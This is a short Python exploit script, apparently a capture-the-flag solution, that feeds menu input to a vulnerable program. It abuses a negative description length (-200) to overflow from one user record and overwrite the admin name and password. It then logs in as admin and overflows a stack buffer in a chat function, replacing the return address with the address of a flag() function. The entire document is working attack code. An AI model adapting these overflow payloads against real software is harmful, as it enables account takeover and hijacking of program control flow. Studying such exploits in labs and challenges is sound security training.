# use python3

# Create user 1
print("0")
print("user1")
print("user1")
print("user1")

# Create user 2
print("0")
print("user 2")
print("user 2")
print("user 2")

# Create user 3
print("0")
print("user 3")
print("user 3")
print("user 3")

# login as user 3
print("7")
print("user 3")
print("user 3")

# overwrite the description length
print("3")
print(-200)

# develop our payload which will overflow from user 3 and change the admin password
payload = ""
payload += "A" * 132
payload += "bala"
payload += "\x00"
payload += "A" * 27
payload += "pass1234"
payload += "\x00"

print(payload)

# log in as the admin with the newly changed password
print("7")
print("bala")
print("pass1234")

# call the chat function which has a buffer overflow vulnerability
print("1")
print()

# overwrite the return addrses with the address of the flag() function
print('A' * 135 + '\xb8\x16\x40\x00\x00\x00\x00\x00\x00\x00\x00')
